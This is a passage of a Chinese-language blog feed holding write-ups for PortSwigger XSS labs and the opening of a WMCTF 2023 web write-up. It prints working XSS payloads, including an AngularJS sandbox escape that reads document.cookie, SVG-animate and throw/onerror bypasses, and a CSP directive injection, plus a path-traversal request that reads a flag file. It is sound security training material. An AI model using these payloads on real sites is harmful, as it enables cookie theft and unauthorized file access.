style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;charAt&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span&gt;3d[]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;join;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;|&lt;&#x2F;span&gt;&lt;span&gt;orderBy&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;toString&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;constructor&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;fromCharCode&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;120&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;61&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;97&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;108&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;101&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;114&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;116&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;40&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;49&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;41&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;del&gt;有点难、也许应该先读一读 AngularJS 源码&lt;&#x2F;del&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;lab-reflected-xss-with-angularjs-sandbox-escape-and-csp&quot;&gt;Lab: &lt;a href=&quot;https:&#x2F;&#x2F;portswigger.net&#x2F;web-security&#x2F;cross-site-scripting&#x2F;reflected&quot;&gt;Reflected XSS&lt;&#x2F;a&gt; with AngularJS sandbox escape and CSP&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;htaccess&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-htaccess &quot;&gt;&lt;code class=&quot;language-htaccess&quot; data-lang=&quot;htaccess&quot;&gt;&lt;span&gt;Content-Security-Policy: 
&lt;&#x2F;span&gt;&lt;span&gt;default-src &amp;#39;self&amp;#39;; script-src &amp;#39;self&amp;#39;; style-src &amp;#39;unsafe-inline&amp;#39; &amp;#39;self&amp;#39;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;script 指定了仅同源&lt;&#x2F;p&gt;
&lt;p&gt;题解通过 hash 触发 AngularJS 中的&lt;code&gt;ng-focus&lt;&#x2F;code&gt;。payload中冒号表示正在发送到过滤器的参数。在参数中，我们没有直接调用警报函数，而是将其分配给变量 z。仅当 orderBy 操作到达 $event.path 数组中的 window 对象时才会调用该函数。这意味着它可以在窗口范围内调用，而无需显式引用&lt;code&gt;window&lt;&#x2F;code&gt;对象，从而有效地绕过 AngularJS 的&lt;code&gt;window&lt;&#x2F;code&gt;检查。&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;html&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt;script&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;location&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;href&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;https:&#x2F;&#x2F;0a580013046fcd29842ff495005000f3.web-security-academy.net&#x2F;?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x&amp;quot;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt;&#x2F;script&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;lab-reflected-xss-with-event-handlers-and-href-attributes-blocked&quot;&gt;Lab: &lt;a href=&quot;https:&#x2F;&#x2F;portswigger.net&#x2F;web-security&#x2F;cross-site-scripting&#x2F;reflected&quot;&gt;Reflected XSS&lt;&#x2F;a&gt; with event handlers and &lt;code&gt;href&lt;&#x2F;code&gt; attributes blocked&lt;&#x2F;h2&gt;
&lt;p&gt;限制了href属性但是要做到 Click button 利用。通过 svg:animate 设置额外的参数。&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;html&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt;svg&amp;gt;&amp;lt;a&amp;gt;&amp;lt;animate &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;attributeName&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;href &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;values&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;javascript:alert(1) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&#x2F;&amp;gt;&amp;lt;text &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;x&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;20 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;y&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;20&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;Click me&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt;&#x2F;text&amp;gt;&amp;lt;&#x2F;a&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;html&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;https:&#x2F;&#x2F;0a750087032fc49e810b346d00650005.web-security-academy.net&#x2F;?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;lab-reflected-xss-in-a-javascript-url-with-some-characters-blocked&quot;&gt;Lab: &lt;a href=&quot;https:&#x2F;&#x2F;portswigger.net&#x2F;web-security&#x2F;cross-site-scripting&#x2F;reflected&quot;&gt;Reflected XSS&lt;&#x2F;a&gt; in a JavaScript URL with some characters blocked&lt;&#x2F;h2&gt;
&lt;p&gt;反射型但是不再有&lt;code&gt;search&lt;&#x2F;code&gt;服务了。只能通过&lt;code&gt;post&lt;&#x2F;code&gt;界面来达成&lt;&#x2F;p&gt;
&lt;p&gt;后端会将 GET 参数渲染出一个 a 元素出来。&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;html&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt;a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;href&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;javascript:fetch(&amp;#39;&#x2F;analytics&amp;#39;, {method:&amp;#39;post&amp;#39;,body:&amp;#39;&amp;lt;encodeURIComponent(input)&amp;gt;&amp;#39;}).finally(_ =&amp;gt; window.location = &amp;#39;&#x2F;&amp;#39;)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;Back to Blog&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt;&#x2F;a&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;不过这个编码不用管。毕竟是 javascript 伪协议，提取时会解码一次。简单测试可以知道block掉了空格和括号和分号&lt;&#x2F;p&gt;
&lt;p&gt;闭合前半 json，然后就可以通过&lt;code&gt;,&lt;&#x2F;code&gt;运算符的方式执行多个表达式。要绕过括号的限制，只能通过覆盖 js runtime 隐式执行的函数、配合 throw error 来实现。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;developer.mozilla.org&#x2F;zh-CN&#x2F;docs&#x2F;Web&#x2F;API&#x2F;EventSource&#x2F;error_event&quot;&gt;onerror&lt;&#x2F;a&gt; 方法用于自定义错误处理，与&lt;code&gt;Error.prepareStackTrace&lt;&#x2F;code&gt;不同的是它仅适用于浏览器。它似乎与&lt;code&gt;EventSource&lt;&#x2F;code&gt;的 onerror 有区别（？&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;js&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-js &quot;&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;post&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;?&lt;&#x2F;span&gt;&lt;span&gt;postId&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;5&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;amp;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;},x=x=&amp;gt;{throw&#x2F;**&#x2F;onerror=alert,1337},toString=x,window+&amp;#39;&amp;#39;,{a:&amp;#39;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;覆盖了&lt;code&gt;onerror&lt;&#x2F;code&gt;和&lt;code&gt;toString&lt;&#x2F;code&gt;。在调用&lt;code&gt;window+&#x27;&#x27;&lt;&#x2F;code&gt;时会隐式执行&lt;code&gt;toString&lt;&#x2F;code&gt;，&lt;code&gt;toString&lt;&#x2F;code&gt;执行触发报错，throw 出一个 1337 被&lt;code&gt;onerror&lt;&#x2F;code&gt;接收成为参数执行。还蛮神奇的u1s1&lt;&#x2F;p&gt;
&lt;p&gt;格式化后的 payload 长这样&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;js&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-js &quot;&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;fetch&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;&#x2F;analytics&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    method&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;post&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    body&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;&#x2F;post?postId=5&amp;amp;&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;x &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;x&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;throw &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;**&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;EventSource&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;onerror &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;alert&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1337
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;toString &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;x&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;window &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    a&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;})&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;finally&lt;&#x2F;span&gt;&lt;span&gt;(_&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;window&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;location &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;&#x2F;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;lab-reflected-xss-protected-by-very-strict-csp-with-dangling-markup-attack&quot;&gt;Lab: Reflected XSS protected by very strict CSP, with dangling markup attack&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;code&gt;dangling markup attack&lt;&#x2F;code&gt;翻译为悬空标记攻击，就是在XSS的基础上设置未闭合引号，造成浏览器解析问题以窃取其后的敏感信息（一般是CSRF Token）&lt;&#x2F;p&gt;
&lt;p&gt;以前见过一题 CTF 关于&lt;code&gt;dangling markup attack&lt;&#x2F;code&gt;，是在后台记录输入账密的地方故意留下悬空标记，然后等管理员登录后闭合以窃取管理员账密。还是比较有趣的。&lt;&#x2F;p&gt;
&lt;p&gt;这题还有一部分是 CSP 问题&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;js&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-js &quot;&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;default-&lt;&#x2F;span&gt;&lt;span&gt;src &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;self&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;&lt;&#x2F;span&gt;&lt;span&gt;object&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;src &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;none&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;; &lt;&#x2F;span&gt;&lt;span&gt;style&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;src &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;self&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;; &lt;&#x2F;span&gt;&lt;span&gt;script&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;src &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;self&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;; &lt;&#x2F;span&gt;&lt;span&gt;img&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;src &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;self&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;; &lt;&#x2F;span&gt;&lt;span&gt;base&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;uri &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;none&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;不过并没有用到 bypass 而是直接 CSRF。&lt;&#x2F;p&gt;
&lt;h2 id=&quot;lab-reflected-xss-protected-by-csp-with-csp-bypass&quot;&gt;Lab: Reflected XSS protected by CSP, with CSP bypass&lt;&#x2F;h2&gt;
&lt;p&gt;CSP: &lt;code&gt;default-src &#x27;self&#x27;; object-src &#x27;none&#x27;;script-src &#x27;self&#x27;; style-src &#x27;self&#x27;; report-uri &#x2F;csp-report?token=&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;注意到CSP携带了一个token参数。可以注入利用&lt;code&gt;script-src-elem&lt;&#x2F;code&gt;来启用内敛脚本。&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;html&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt;script&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;alert&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt;&#x2F;script&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;&amp;amp;token=;script-src-elem &amp;#39;unsafe-inline&amp;#39;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;em&gt;感觉不能叫 bypass ，应该是 Injection&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;
&lt;p&gt;完结喽~&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>wmctf2023 web writeup. in zh-CN</title>
        <published>2023-08-24T00:00:00+08:00</published>
        <updated>2023-08-24T00:00:00+08:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="/blog/wmctf/"/>
        <id>/blog/wmctf/</id>
        
        <content type="html" xml:base="/blog/wmctf/">&lt;h2 id=&quot;anyfileread&quot;&gt;AnyFileRead&lt;&#x2F;h2&gt;
&lt;p&gt;存在解析差异问题&lt;&#x2F;p&gt;
&lt;p&gt;用 &lt;code&gt;&#x2F;admin&#x2F;..&#x2F;&lt;&#x2F;code&gt; 绕过&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;GET &#x2F;&lt;&#x2F;span&gt;&lt;span&gt;admin&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;..&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;flag &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;HTTP&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span&gt;Host&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;43&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;132&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;224&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;5&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;8888
&lt;&#x2F;span&gt;&lt;span&gt;Pragma&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;no&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;cache
&lt;&#x2F;span&gt;&lt;span&gt;Cache&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;Control&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;no&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;cache
&lt;&#x2F;span&gt;&lt;span&gt;Upgrade&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;Insecure&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;Requests&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span&gt;User&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;Agent&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;Mozilla&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;5&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0 &lt;&#x2F;span&gt;&lt;span&gt;(Windows &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;NT &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;; Win64; x64) AppleWebKit&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;537&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;36 &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;KHTML&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;like Gecko) Chrome&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;116&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span 